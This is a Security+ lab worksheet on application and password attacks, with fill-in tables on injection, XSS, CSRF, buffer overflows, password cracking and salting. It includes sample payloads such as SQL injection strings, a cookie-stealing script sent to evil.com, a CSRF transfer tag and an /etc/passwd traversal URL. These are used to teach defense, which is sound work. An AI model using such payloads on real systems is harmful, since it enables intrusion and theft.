# Lab 10: Application and Password Attacks

**Tier:** 1 (Universal) + Tier 2 (Bonus)
**Time:** 30-35 minutes
**Exam Objectives:** 2.2 - Explain common threat vectors and attack surfaces

---

## Section 1: Concept Check (5 min)

Answer these questions in your own words:

1. **What is SQL injection, and why is it so dangerous?**

2. **Explain the difference between reflected XSS and stored XSS. Which is more dangerous and why?**

3. **What is CSRF (Cross-Site Request Forgery), and how does it differ from XSS?**

4. **Compare brute force, dictionary, and password spraying attacks. When would an attacker use each?**

5. **What is a buffer overflow, and what can an attacker achieve with one?**

---

## Section 2: Hands-On Activities

### Activity A: Injection Attack Types

**Goal:** Understand various injection vulnerabilities.

**Injection attack comparison:**

| Injection Type | What's Injected | Target | Example Impact |
|----------------|-----------------|--------|----------------|
| SQL Injection | | | |
| Command Injection | | | |
| LDAP Injection | | | |
| XML Injection | | | |
| XPath Injection | | | |
| Header Injection | | | |

**SQL Injection categories:**

| Type | How It Works | Attacker Sees Results? |
|------|--------------|----------------------|
| In-band (Classic) | | |
| Blind (Boolean-based) | | |
| Blind (Time-based) | | |
| Out-of-band | | |

**Why does injection work?**

_________________________________________________________________

---

### Activity B: SQL Injection Analysis

**Goal:** Understand how SQL injection exploits work.

**Vulnerable code example (PHP):**

```php
$username = $_POST['username'];
$password = $_POST['password'];
$query = "SELECT * FROM users WHERE username='$username' AND password='$password'";
```

**Normal login:**

| Input | Resulting Query |
|-------|-----------------|
| Username: `john` | |
| Password: `secret123` | |

Write the complete query: 

```sql

```

**SQL injection attack:**

| Input | Resulting Query |
|-------|-----------------|
| Username: `admin'--` | |
| Password: `anything` | |

Write the complete query:

```sql

```

**What does `--` do in SQL?** _______________________________________

**Why does this bypass authentication?**

_________________________________________________________________

**More injection payloads:**

| Payload | Purpose | Resulting Query Behavior |
|---------|---------|-------------------------|
| `' OR '1'='1` | | |
| `'; DROP TABLE users;--` | | |
| `' UNION SELECT * FROM passwords--` | | |
| `admin'/*` | | |

**SQL injection defenses:**

| Defense | How It Works |
|---------|--------------|
| Parameterized queries (prepared statements) | |
| Input validation | |
| Stored procedures | |
| Least privilege database accounts | |
| Web Application Firewall (WAF) | |
| Escape special characters | |

---

### Activity C: Cross-Site Scripting (XSS)

**Goal:** Understand XSS attack types and prevention.

**XSS types comparison:**

| Type | Where Payload Is Stored | Who Can Be Attacked | Persistence |
|------|------------------------|--------------------|----|
| Reflected XSS | | | |
| Stored XSS | | | |
| DOM-based XSS | | | |

**Reflected XSS example:**

Vulnerable search page:
```html
<h1>Search results for: <?php echo $_GET['query']; ?></h1>
```

**Normal usage:**
```
URL: https://site.com/search?query=laptops
Output: Search results for: laptops
```

**XSS attack:**
```
URL: https://site.com/search?query=<script>alert('XSS')</script>
Output: Search results for: 
```

What executes in the victim's browser? _________________________________

**Stored XSS example:**

Comment form that displays comments:
```html
<div class="comment"><?php echo $comment; ?></div>
```

| Attacker Posts | What Happens |
|----------------|--------------|
| `<script>document.location='http://evil.com/steal?c='+document.cookie</script>` | |

**Why is stored XSS more dangerous than reflected?**

_________________________________________________________________

**XSS attack capabilities:**

What can an attacker do with XSS?

| Capability | Example |
|------------|---------|
| Steal cookies | |
| Session hijacking | |
| Keylogging | |
| Phishing | |
| Malware distribution | |
| Deface website | |

**XSS defenses:**

| Defense | How It Works |
|---------|--------------|
| Output encoding | |
| Input validation | |
| Content Security Policy (CSP) | |
| HTTPOnly cookies | |
| X-XSS-Protection header | |

---

### Activity D: Cross-Site Request Forgery (CSRF)

**Goal:** Understand CSRF attacks and prevention.

**How CSRF works:**

| Step | What Happens |
|------|--------------|
| 1 | User logs into legitimate site (bank.com) |
| 2 | |
| 3 | |
| 4 | |

**CSRF attack example:**

User is logged into bank.com. Attacker's page contains:

```html
<img src="https://bank.com/transfer?to=attacker&amount=1000" />
```

| Question | Answer |
|----------|--------|
| What happens when user visits attacker's page? | |
| Why does the bank process this request? | |
| Did the attacker need the user's password? | |

**CSRF vs XSS:**

| Aspect | XSS | CSRF |
|--------|-----|------|
| Exploits trust in | | |
| Attacker runs code | | |
| Requires user action | | |
| Steals data directly | | |

**CSRF defenses:**

| Defense | How It Works |
|---------|--------------|
| Anti-CSRF tokens | |
| SameSite cookies | |
| Referer header checking | |
| Re-authentication for sensitive actions | |
| CAPTCHA | |

---

### Activity E: Other Application Attacks

**Goal:** Understand additional web application vulnerabilities.

**Attack type reference:**

| Attack | How It Works | Example |
|--------|--------------|---------|
| Directory Traversal | | |
| File Inclusion (LFI/RFI) | | |
| Insecure Direct Object Reference | | |
| Server-Side Request Forgery (SSRF) | | |
| XML External Entity (XXE) | | |
| Insecure Deserialization | | |

**Directory traversal example:**

Normal request:
```
https://site.com/download?file=report.pdf
```

Attack:
```
https://site.com/download?file=../../../etc/passwd
```

What is the attacker trying to access? _________________________________

**IDOR example:**

Normal request:
```
https://site.com/account?id=12345  (your account)
```

Attack:
```
https://site.com/account?id=12346  (someone else's account)
```

What vulnerability exists? _________________________________

---

### Activity F: Buffer Overflow Concepts

**Goal:** Understand buffer overflow attacks.

**How buffer overflow works:**

| Step | What Happens |
|------|--------------|
| 1 | Program allocates fixed-size buffer (e.g., 64 bytes) |
| 2 | |
| 3 | |
| 4 | |

**Memory layout (simplified):**

```
Lower addresses
┌──────────────────┐
│     Buffer       │  ← User input goes here
├──────────────────┤
│   Saved EBP      │  ← Overwritten if buffer overflows
├──────────────────┤
│  Return Address  │  ← Attacker's target!
├──────────────────┤
│   Parameters     │
└──────────────────┘
Higher addresses
```

**What can attacker achieve?**

| Goal | How |
|------|-----|
| Crash program | |
| Execute arbitrary code | |
| Gain elevated privileges | |

**Buffer overflow defenses:**

| Defense | How It Works |
|---------|--------------|
| ASLR (Address Space Layout Randomization) | |
| DEP/NX (Data Execution Prevention) | |
| Stack canaries | |
| Safe functions (strncpy vs strcpy) | |
| Bounds checking | |
| Code review | |

---

### Activity G: Password Attack Types

**Goal:** Understand password cracking methodologies.

**Password attack comparison:**

| Attack Type | Method | Speed | When to Use |
|-------------|--------|-------|-------------|
| Brute Force | | | |
| Dictionary | | | |
| Hybrid | | | |
| Rainbow Table | | | |
| Password Spraying | | | |
| Credential Stuffing | | | |

**Brute force math:**

For a password with:
- 8 characters
- Only lowercase letters (26 options)

| Calculation | Value |
|-------------|-------|
| Possible combinations | 26^8 = |
| At 1 billion guesses/second | |
| Time to crack | |

Now add uppercase (52 options):
| Calculation | Value |
|-------------|-------|
| Possible combinations | 52^8 = |
| At 1 billion guesses/second | |

Add numbers and symbols (95 printable ASCII):
| Calculation | Value |
|-------------|-------|
| Possible combinations | 95^8 = |
| At 1 billion guesses/second | |

**Password length impact:**

| Length | Lowercase only (26) | Full ASCII (95) |
|--------|--------------------:|----------------:|
| 6 | 308 million | 735 billion |
| 8 | 208 billion | 6.6 quadrillion |
| 10 | 141 trillion | 59 quintillion |
| 12 | 95 quadrillion | 540 sextillion |

**What's more important: length or complexity?** _______________________

---

### Activity H: Password Spraying vs Credential Stuffing

**Goal:** Differentiate targeted password attacks.

**Password spraying:**

| Aspect | Details |
|--------|---------|
| Targets | |
| Passwords tried | |
| Why it works | |
| Avoids | |
| Example | |

**Credential stuffing:**

| Aspect | Details |
|--------|---------|
| Targets | |
| Credentials from | |
| Why it works | |
| Scale | |
| Example | |

**Scenario identification:**

| Scenario | Attack Type |
|----------|-------------|
| Attacker tries "Summer2024!" against all employee accounts | |
| Attacker uses LinkedIn breach passwords on Netflix | |
| Attacker tries every combination against one account | |
| Attacker uses rockyou.txt wordlist against hash file | |
| Attacker tries 3 common passwords, waits 30 min, tries 3 more | |

---

### Activity I: Rainbow Tables and Salting

**Goal:** Understand pre-computed hash attacks and defenses.

**How rainbow tables work:**

| Step | Description |
|------|-------------|
| 1 | Pre-compute hashes for millions of passwords |
| 2 | |
| 3 | |

**Rainbow table attack:**

| Stolen Hash | Lookup | Result |
|-------------|--------|--------|
| `5f4dcc3b5aa765d61d8327deb882cf99` | Search table | `password` |
| `e99a18c428cb38d5f260853678922e03` | Search table | `abc123` |

**Why salting defeats rainbow tables:**

| Without Salt | With Salt |
|--------------|-----------|
| hash("password") = `5f4dcc3b...` | hash("password" + "x7Gh9") = `a1b2c3d4...` |
| Same password = same hash | Same password = different hash |
| Rainbow table works | Need new table per salt |

**Salting example:**

| User | Password | Salt | Hash Input | Hash Output |
|------|----------|------|------------|-------------|
| Alice | `secret` | `abc123` | | |
| Bob | `secret` | `xyz789` | | |

Do Alice and Bob have the same hash output? _______

**Password storage best practices:**

| Practice | Purpose |
|----------|---------|
| Unique salt per password | |
| Key stretching (bcrypt, Argon2, PBKDF2) | |
| High iteration count | |
| Never store plaintext | |

---

### Activity J: Password Policy Analysis

**Goal:** Evaluate password security requirements.

**Analyze these password policies:**

**Policy A:**
- Minimum 8 characters
- Must contain uppercase, lowercase, number, symbol
- Change every 90 days
- Cannot reuse last 5 passwords

| Strength | Weakness |
|----------|----------|
| | |
| | |

**Policy B:**
- Minimum 16 characters
- No complexity requirements
- No expiration
- Block common passwords list

| Strength | Weakness |
|----------|----------|
| | |
| | |

**Which policy is better according to current NIST guidelines?** ___________

**Modern password guidance (NIST 800-63B):**

| Old Recommendation | New Recommendation |
|-------------------|-------------------|
| Complex character requirements | |
| Regular password changes | |
| Security questions | |
| Short minimum length | |

**Account lockout configuration:**

| Setting | Too Low | Too High | Recommended |
|---------|---------|----------|-------------|
| Failed attempts before lockout | | | |
| Lockout duration | | | |
| Reset counter after | | | |

---

### Activity K: OWASP Top 10 Reference

**Goal:** Know the most critical web application security risks.

**Map vulnerabilities to OWASP Top 10 (2021):**

| OWASP Category | Vulnerabilities Included |
|----------------|-------------------------|
| A01: Broken Access Control | |
| A02: Cryptographic Failures | |
| A03: Injection | |
| A04: Insecure Design | |
| A05: Security Misconfiguration | |
| A06: Vulnerable Components | |
| A07: Auth & Session Failures | |
| A08: Software & Data Integrity | |
| A09: Logging & Monitoring Failures | |
| A10: Server-Side Request Forgery | |

**Which category do these attacks belong to?**

| Attack | OWASP Category |
|--------|----------------|
| SQL Injection | |
| XSS | |
| CSRF | |
| IDOR | |
| Default credentials | |
| Using outdated library | |
| Missing authentication | |

---

### Tier 2 Bonus: Using CyberChef for Analysis

> CyberChef: gchq.github.io/CyberChef (browser-based, no install)

---

### Activity L: Password Hash Analysis

**Goal:** Identify and understand password hashes.

**Identify hash types by format:**

| Hash | Likely Type | Length |
|------|-------------|--------|
| `5f4dcc3b5aa765d61d8327deb882cf99` | | |
| `5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8` | | |
| `$2a$10$N9qo8uLOickgx2ZMRZoMye` | | |
| `$6$rounds=5000$salt$hash...` | | |
| `aad3b435b51404eeaad3b435b51404ee:31d6...` | | |

**Hash characteristics:**

| Hash Type | Length | Salted? | Iterations | Security |
|-----------|--------|---------|------------|----------|
| MD5 | | | | |
| SHA-1 | | | | |
| SHA-256 | | | | |
| bcrypt | | | | |
| NTLM | | | | |

**Using CyberChef:**

1. Go to gchq.github.io/CyberChef
2. Try these operations:

**Hash a password:**
- Input: `password123`
- Operation: MD5
- Output: _______________________

**Decode Base64:**
- Input: `YWRtaW46cGFzc3dvcmQ=`
- Operation: From Base64
- Output: _______________________

**What credentials were encoded?** _______________________

---

## Section 3: Reflection Scenarios (5 min)

**Scenario 1:** A penetration test reveals your web application is vulnerable to SQL injection. The development team says they'll fix it in the next quarterly release (3 months away). What temporary mitigations would you implement, and why is waiting problematic?

_________________________________________________________________

_________________________________________________________________

**Scenario 2:** After a breach at another company, you discover 40% of your employees used their corporate email/password combination on that site. What immediate actions do you take, and what long-term changes would you recommend?

_________________________________________________________________

_________________________________________________________________

**Scenario 3:** Your security scan found stored XSS in a legacy application that's used by thousands of users daily. The original developers are gone, and no one understands the codebase. How do you approach this?

_________________________________________________________________

_________________________________________________________________

---

## Section 4: Key Takeaways Checklist

Before finishing, ensure you can:

- [ ] Explain SQL injection and its prevention (parameterized queries)
- [ ] Differentiate reflected, stored, and DOM-based XSS
- [ ] Explain how CSRF exploits trusted sessions
- [ ] Describe buffer overflow and memory protection techniques
- [ ] Compare brute force, dictionary, spraying, and stuffing attacks
- [ ] Explain how rainbow tables work and why salting defeats them
- [ ] Evaluate password policies against modern recommendations
- [ ] Identify OWASP Top 10 vulnerability categories

---

## What You Learned Today

- ✅ Analyzed injection attack types
- ✅ Traced SQL injection queries step by step
- ✅ Compared XSS attack variants
- ✅ Understood CSRF attack mechanics
- ✅ Explored buffer overflow concepts
- ✅ Calculated password brute force times
- ✅ Differentiated password attack types
- ✅ Learned how salting defeats rainbow tables
- ✅ Evaluated password policies
- ✅ Mapped attacks to OWASP Top 10
- ✅ (Tier 2) Analyzed hashes with CyberChef

**Next Lab:** Vulnerability Types - understanding vulnerability categories and assessment.

---

*CertifyStack - CompTIA Security+ (SY0-701)*
*Lab 10: Application and Password Attacks*